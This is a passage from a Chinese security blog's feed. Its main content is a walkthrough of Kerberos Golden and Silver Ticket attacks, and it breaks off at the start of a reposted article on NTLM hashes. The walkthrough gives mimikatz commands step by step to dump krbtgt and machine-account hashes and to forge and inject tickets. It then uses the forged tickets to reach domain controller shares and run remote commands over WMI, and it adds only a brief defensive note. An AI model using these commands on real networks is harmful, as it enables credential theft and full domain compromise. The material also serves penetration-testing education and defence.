09c2e8bc5d7c571fb2f35c6aeb0115ea3235c26892445b2601aaf70f6bfe3b6ce444263c5f40f6b92b678aafcd64cc9d043fd1ce173a6a1836da8591a102602af6854be02c3eb0ccea507d7ec0743b6dfa13cfb1381e0d6a5b555eb4b7dbbe9b0e484ae623bf5b2adb117b0fbc4a157304717f7d781e19e4700735fd7464a70edf0f85038e64a85f5ba10afa7a5843f5d4fa8edc8429eefcc587c45db34e838c6445bb6f5f4e10f550b3ebd4657</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>浅析黄金票据与白银票据</title>
    <link href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/"/>
    <id>https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</id>
    <published>2020-06-06T00:31:56.000Z</published>
    <updated>2020-06-07T06:00:03.613Z</updated>
    
    <content type="html"><![CDATA[<h2 id="浅析黄金票据与白银票据"><a href="#浅析黄金票据与白银票据" class="headerlink" title="浅析黄金票据与白银票据"></a>浅析黄金票据与白银票据</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        票据传递攻击（PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用<strong>黄金票据</strong>和<strong>白银票据</strong>，通过PtT访问主机相当简单。</p><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>我们首先需要学习关于kerberos认证</p><ul><li><strong>KDC</strong>(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS</li><li><strong>AS</strong>(Authentication Server)： 身份认证服务</li><li><strong>TGS</strong>(Ticket Granting Server)： 票据授予服务</li><li><strong>TGT</strong>(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时</li><li><strong>Pass The Ticket</strong>： 如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限</li></ul><h3 id="金票-GoldenTicket"><a href="#金票-GoldenTicket" class="headerlink" title="(金票)GoldenTicket"></a>(金票)GoldenTicket</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>​        <strong>Golden Ticket</strong>（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p><p>​        每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET,</p><p>​        对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p><p><img src="2016011804523676070160.png" alt="Alt text"></p><h5 id="黄金票据特点"><a href="#黄金票据特点" class="headerlink" title="黄金票据特点"></a>黄金票据特点</h5><ul><li>域控制器中的KDC服务不验证TGT中的用户帐户，直到<a href="http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html" target="_blank" rel="noopener">TGT超过20分钟，</a>这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</li><li>由于在域控制器上由KDC服务生成的域设置了Kerberos策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年。</li><li>该<a href="http://adsecurity.org/?p=483" target="_blank" rel="noopener">KRBTGT</a>帐户密码<a href="http://adsecurity.org/?p=483" target="_blank" rel="noopener">从不更改*</a>和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在。</li><li>它绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规验证。</li><li>.这个精心创建的TGT要求攻击者拥有Active Directory域的KRBTGT密码哈希值（<a href="http://adsecurity.org/?p=451" target="_blank" rel="noopener">通常从域控制器转储</a>）。</li><li>KRBTGT NTLM哈希可用于生成一个有效的TGT（使用RC4）模拟任何用户访问Active Directory中的任何资源。</li><li>在主机上都可以生成和使用黄金票据（TGT），即使没有加入域也是如此。只要网络可以访问域。</li><li>用于从AD森林中的DC获取有效的TGS票据，并提供一个坚持在一切域访问所有的主机的好办法。</li></ul><h5 id="制作金票的条件："><a href="#制作金票的条件：" class="headerlink" title="制作金票的条件："></a>制作金票的条件：</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、域名称            </span><br><span class="line"><span class="number">2</span>、域的SID值</span><br><span class="line"><span class="number">3</span>、域的KRBTGT账户密码HASH</span><br><span class="line"><span class="number">4</span>、伪造用户名，可以是任意的</span><br></pre></td></tr></table></figure><p>实战中，通常使用Mimikatz来提取krbtgt的NTLM-Hash。</p><p>1.获取域名称</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">view</span> /<span class="built_in">domain</span></span><br></pre></td></tr></table></figure><p>2.Mimikatz获取krbtgt的HTLM-Hash及域SID</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> <span class="string">"lsadump::dcsync /domain:test666.com /user:krbtgt"</span></span><br></pre></td></tr></table></figure><p>3..Mimikatz生成黄金票据</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "kerberos::golden /domain:test666.com /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1497092113</span><span class="string">-2272191533</span><span class="string">-193330055</span> /krbtgt:cac9c793eb3ba2c6abbcc9c14f18a41f /user:test666 /ticket:golden.kirbi"</span><br></pre></td></tr></table></figure><h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤:"></a>利用步骤:</h4><h5 id="1-导出krbtgt的Hash"><a href="#1-导出krbtgt的Hash" class="headerlink" title="1.导出krbtgt的Hash"></a><strong>1.导出krbtgt的Hash</strong></h5><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">lsadump:</span>:dcsync <span class="regexp">/OWA2010SP3.0day.org /</span><span class="string">user:</span>krbtgt</span><br></pre></td></tr></table></figure><p>命令获取krbtgt的值。</p><p><img src="1566542295163.png" alt=""></p><h5 id="2-生成Golden-Ticket"><a href="#2-生成Golden-Ticket" class="headerlink" title="2.生成Golden Ticket"></a><strong>2.生成Golden Ticket</strong></h5><p>​        得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p><p>参数说明：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/admin</span>：伪造的用户名</span><br><span class="line"><span class="string">/domain</span>：域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，注意是去掉最后一个-后面的值</span><br><span class="line"><span class="string">/krbtgt</span>：krbtgt的HASH值</span><br><span class="line"><span class="string">/ticket</span>：生成的票据名称</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /krbtgt:<span class="number">36f</span>9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure><p><img src="1566543225966.png" alt=""></p><h5 id="3-导入伪造Golden-Ticket获得域控权限"><a href="#3-导入伪造Golden-Ticket获得域控权限" class="headerlink" title="3.  导入伪造Golden Ticket获得域控权限"></a><strong>3.  导入伪造Golden Ticket获得域控权限</strong></h5><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ppt golden.kiribi</span><br><span class="line">kerberos::<span class="built_in">list</span></span><br></pre></td></tr></table></figure><p><img src="1566542805439.png" alt=""></p><p>此时就可以通过dir成功访问域控的共享文件夹。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir <span class="symbol">\\</span>OWA2010SP3.0day.org<span class="symbol">\c</span>$</span><br></pre></td></tr></table></figure><p><img src="1566543260644.png" alt=""></p><p><strong>TIPS:</strong></p><p>​    生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash<br>可以用<strong>mimikatz “lsadump::lsa /patch”</strong>导出:</p><p><img src="1049983-20171227215506456-245748150.png" alt="img"></p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul><li>这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可。</li><li>可以伪造任意用户，即使其不存在。</li><li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。</li></ul><h4 id="黄金票据防御"><a href="#黄金票据防御" class="headerlink" title="黄金票据防御"></a>黄金票据防御</h4><ul><li><strong>限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组</strong>。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。</li><li><strong>禁用KRBTGT帐户，并保存当前的密码以及以前的密码</strong>。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证。</li></ul><h3 id="银票-SilverTickets"><a href="#银票-SilverTickets" class="headerlink" title="(银票)SilverTickets"></a>(银票)SilverTickets</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​        Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p><p><strong>正确的认证流程:</strong></p><p><img src="20160118045254154911118.png" alt="Alt text"></p><p><strong>使用了Silver Ticke的认证流程:</strong></p><p><img src="20160118045256924591213.png" alt="Alt text"></p><h5 id="白银票据的特点"><a href="#白银票据的特点" class="headerlink" title="白银票据的特点"></a>白银票据的特点</h5><ul><li>.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li><li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</li><li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li><li>攻击者需要服务帐户密码哈希值</li><li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。</li><li>任何事件日志都在目标服务器上。</li></ul><p><strong>制作银票的条件：</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>域名称</span><br><span class="line"><span class="number">2.</span>域的SID值</span><br><span class="line"><span class="number">3.</span>域中的Server服务器账户的NTLM-Hash</span><br><span class="line"><span class="number">4.</span>伪造的用户名，可以是任意用户名.</span><br><span class="line"><span class="number">5.</span>目标服务器上面的kerberos服务</span><br></pre></td></tr></table></figure><p><strong>白银票据的服务列表</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote<span class="built_in"> Server </span>   RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><h5 id="1-获取hash-sid等信息"><a href="#1-获取hash-sid等信息" class="headerlink" title="1.获取hash sid等信息"></a>1.获取hash sid等信息</h5><p>  首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是OWA2010SP3$的HASH。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mimikatz</span><span class="selector-class">.exe</span> "<span class="selector-tag">privilege</span><span class="selector-pseudo">::debug"</span> "<span class="selector-tag">sekurlsa</span><span class="selector-pseudo">::logonpasswords"</span> "<span class="selector-tag">exit</span>" &gt; 1<span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="1566649973247.png" alt=""></p><h5 id="2-伪造白银票据"><a href="#2-伪造白银票据" class="headerlink" title="2.伪造白银票据"></a>2.伪造白银票据</h5><p>这时得到了OWA2010SP3$的HASH值，通过mimikatz生成银票。</p><p>参数说明：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/domain</span>：当前域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，和金票一样取前面一部分</span><br><span class="line"><span class="string">/target</span>：目标主机，这里是OWA2010SP3.0day.org</span><br><span class="line"><span class="string">/service</span>：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line"><span class="string">/rc4</span>：目标主机的HASH值</span><br><span class="line"><span class="string">/user</span>：伪造的用户名</span><br><span class="line"><span class="string">/ptt</span>：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用<span class="string">/ticket</span>导出之后再使用kerberos:<span class="function">:ptt</span>来导入</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /target:OWA2010SP3<span class="number">.0</span>day.org /service:cifs /rc4:<span class="number">125445</span>ed1d553393cce9585e64e3fa07 /user:silver /ptt</span><br></pre></td></tr></table></figure><p><img src="1566654188946.png" alt=""></p><p>这时通过klist查看当前会话的kerberos票据可以看到生成的票据。</p><p><img src="1566654225879.png" alt=""></p><p>使用<code>dir \\OWA2010SP3.0day.org\c$</code>访问DC的共享文件夹。</p><p><img src="1566654265383.png" alt=""></p><h4 id="各种服务中的示例"><a href="#各种服务中的示例" class="headerlink" title="各种服务中的示例"></a>各种服务中的示例</h4><table><thead><tr><th>Service Type</th><th>Service Silver Tickets</th></tr></thead><tbody><tr><td>WMI</td><td>HOST RPCSS</td></tr><tr><td>PowerShell Remoting</td><td>HOST HTTP</td></tr><tr><td>WinRM</td><td>HOST HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>LDAP operations includingMimikatz DCSync</td><td>LDAP</td></tr><tr><td>Windows Remote Server Administration Tools</td><td>RPCSS LDAP CIFS</td></tr></tbody></table><h5 id="Windows共享（CIFS）管理访问的银票"><a href="#Windows共享（CIFS）管理访问的银票" class="headerlink" title="Windows共享（CIFS）管理访问的银票"></a>Windows共享（CIFS）管理访问的银票</h5><p>为 “cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。</p><p>注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括</p><p>c $共享，我们能够将文件拷贝到共享文件中。</p><h5 id="具有管理员权限的Windows计算机（HOST）白银票据"><a href="#具有管理员权限的Windows计算机（HOST）白银票据" class="headerlink" title="具有管理员权限的Windows计算机（HOST）白银票据"></a>具有管理员权限的Windows计算机（HOST）白银票据</h5><p>创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。</p><h5 id="Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行"><a href="#Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行" class="headerlink" title="Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行"></a>Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行</h5><p>为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。</p><p>注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。</p><h5 id="白银票据证连接到具有管理员权限Windows计算机上的LDAP"><a href="#白银票据证连接到具有管理员权限Windows计算机上的LDAP" class="headerlink" title="白银票据证连接到具有管理员权限Windows计算机上的LDAP"></a>白银票据证连接到具有管理员权限Windows计算机上的LDAP</h5><p>为“ldap”服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。</p><p>利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息</p><p><strong>注：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync</span><br></pre></td></tr></table></figure><p>​    向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户，只读域控制器默认不允许读取用户密码数据。</p><h5 id="白银票据证连接到具有管理员权限Windows计算机上的WMI"><a href="#白银票据证连接到具有管理员权限Windows计算机上的WMI" class="headerlink" title="白银票据证连接到具有管理员权限Windows计算机上的WMI"></a>白银票据证连接到具有管理员权限Windows计算机上的WMI</h5><p> 为“ HOST ”服务和“ rpcss ”服务创建白银票据以使用WMI在目标系统上远程执行命令。</p><p>注入这些白银票据之后，我们可以通过运行“klist”来确认Kerberos TGS票据在内存中注入白银票据后，我们可以通过“传票”来调用WMIC或Invoke-WmiMethod在目标系统上运行命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> win32_process <span class="literal">-ComputerName</span> <span class="variable">$</span> Computer <span class="literal">-Credential</span> <span class="variable">$</span> Creds <span class="literal">-name</span> create <span class="literal">-argumentlist</span>“<span class="variable">$</span> RunCommand”</span><br></pre></td></tr></table></figure><h5 id="访问域控上“cifs”服务实列"><a href="#访问域控上“cifs”服务实列" class="headerlink" title="访问域控上“cifs”服务实列"></a>访问域控上“cifs”服务实列</h5><p>首先需要获得如下信息：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">domain</span><br><span class="line"><span class="string">/sid</span></span><br><span class="line"><span class="string">/target</span>:目标服务器的域名全称，此处为域控的全称</span><br><span class="line"><span class="string">/service</span>：目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line"><span class="string">/rc4</span>：计算机账户的NTLM hash，域控主机的计算机账户</span><br><span class="line"><span class="string">/user</span>：要伪造的用户名，此处可用silver测试</span><br></pre></td></tr></table></figure><p>使用mimikatz执行如下命令导入Silver Ticket</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "kerberos::golden /domain:test.local /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-4155807533</span><span class="string">-921486164</span><span class="string">-2767329826</span> /target:WIN<span class="string">-8</span>VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"</span><br></pre></td></tr></table></figure><p>此时可以成功访问域控上的文件共享</p><h4 id="关于黄金票据和白银票据的一些区别"><a href="#关于黄金票据和白银票据的一些区别" class="headerlink" title="关于黄金票据和白银票据的一些区别:"></a>关于黄金票据和白银票据的一些区别:</h4><h5 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h5><ul><li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li><li>Silver Ticket: 伪造TGS,只能访问指定的服务</li></ul><p><strong>2.加密方式不同</strong></p><ul><li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li><li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li></ul><h5 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h5><ul><li>Golden Ticket 的利用过程需要访问域控(KDC)</li><li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ul><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p>[<a href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html]" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html]</a>(<a href="https://wooyun.js.org/drops/域渗透——Pass" target="_blank" rel="noopener">https://wooyun.js.org/drops/域渗透——Pass</a> The Ticket.html)</p><p><a href="http://www.test666.me/archives/264/" target="_blank" rel="noopener">http://www.test666.me/archives/264/</a></p><p><a href="https://uknowsec.cn/posts/notes/域渗透-Ticket.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.html</a></p><p><a href="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/</a></p><p><a href="http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/" target="_blank" rel="noopener">http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/</a></p><h5 id=""><a href="#" class="headerlink" title=""></a></h5>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;浅析黄金票据与白银票据&quot;&gt;&lt;a href=&quot;#浅析黄金票据与白银票据&quot; class=&quot;headerlink&quot; title=&quot;浅析黄金票据与白银票据&quot;&gt;&lt;/a&gt;浅析黄金票据与白银票据&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="域渗透" scheme="https://shu1l.github.io/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="票据" scheme="https://shu1l.github.io/tags/%E7%A5%A8%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>域渗透之NTML hash</title>
    <link href="https://shu1l.github.io/2020/06/05/yu-shen-tou-zhi-ntml-hash/"/>
    <id>https://shu1l.github.io/2020/06/05/yu-shen-tou-zhi-ntml-hash/</id>
    <published>2020-06-05T14:25:49.000Z</published>
    <updated>2020-06-07T10:45:17.946Z</updated>
    
    <content type="html"><![CDATA[<p><strong>转载自:</strong><a href="https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/" target="_blank" rel="noopener">https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/</a></p><h2 id="域渗透之NTML-Hash"><a href="#域渗透之NTML-Hash" class="headerlink" title="域渗透之NTML-Hash"></a>域渗透之NTML-Hash</h2><h3 id="一、认识Windows-HASH"><a href="#一、认识Windows-HASH" class="headerlink" title="一、认识Windows HASH"></a>一、认识Windows HASH</h3><p>​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了<strong>WindowsNT挑战/响应验证机制</strong>，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。</p><p>​     NTLM-Hash与LM-Hash算法相比，明文口令大小写敏感，但无法根据NTLM-Hash判断原始明文口令是否小于8字节，摆脱了魔术字符串<code>KGS!@#$%</code>。MD4是真正的单向哈希函数，穷举做为数据源出现的明文，难度较大。问题在于，微软一味强调NTLM-Hash的强度高，却避而不谈一个事实，为了保持向后兼容性，NTLM-Hash缺省总是与LM-Hash一起使用的。这意味着NTLM-Hash强调再高也是无助于安全的，相反潜在损害着安全性。增加NTLM-Hash后，首先利用LM-Hash的弱点穷举出原始明文口令的大小写不敏感版本，再利用NTLM-Hash修正出原始明文口令的大小写敏感版本</p><h4 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM HASH"></a>LM HASH</h4><p>​    <code>LM HASH</code>是一种较古老的Hash，在<code>LAN Manager</code>协议中使用，非常容易通过暴力破解获取明文凭据。Vista以前的Windows OS使用它，Vista之后的版本默认禁用了LM协议，但某些情况下还是可以使用。</p><p><strong>补充：</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windows Vista`和`Windows<span class="built_in"> Server </span>2008`以前的系统还会使用LM hash。LM hash的生成方法本文暂不介绍。自Vista和2008开始，Windows取消LM hash，但某些工具的参数需要填写固定格式`LM hash:NT hash`，可以将LM Hash填0(LM hash可以为任意值)，即`00000000000000000000000000000000:NT hash</span><br></pre></td></tr></table></figure><h4 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM HASH"></a>NTLM HASH</h4><p>​    <code>NTLM Hash（NT LAN Manager）</code>是支持<code>Net NTLM</code>认证协议及<code>本地认证</code>过程中的一个重要参数。其长度为32位，由数字与字母组成。它的前身是<code>LM Hash</code>，目前基本淘汰，两者相差不大，只是使用的加密算法不同。</p><p><strong>本地认证</strong>：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在<code>SAM (Security Account Manager Database，安全账号管理数据库)</code>中。SAM文件的路径是<code>%SystemRoot%\system32\config\sam</code>。在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较，从而实现认证。</p><blockquote><p>Note：类似的，在域环境下，DC (Domain Controller，域控制器)中也存在这样的数据库<code>AD (Account Database)</code>，位于<code>ntds.dit</code>文件</p></blockquote><p>NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p><p>通常意义上的<code>NTLM Hash</code>指存储在<code>SAM</code>数据库及<code>NTDS数据库</code>中对密码进行Hash摘要计算后的结果，这类Hash可以直接用于PTH，并且通常存在于<code>LSASS</code>进程中，便于SSP使用。</p><p>本地认证流程</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">winlogon</span>.exe -&gt;</span> 接收用户输入 -&gt; <span class="function"><span class="title">lsass</span>.exe -&gt;</span> (认证)</span><br></pre></td></tr></table></figure><p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对比SAM数据库中的hash进行验证。</p><ul><li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li></ul><p>在系统中，hash格式是类似这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 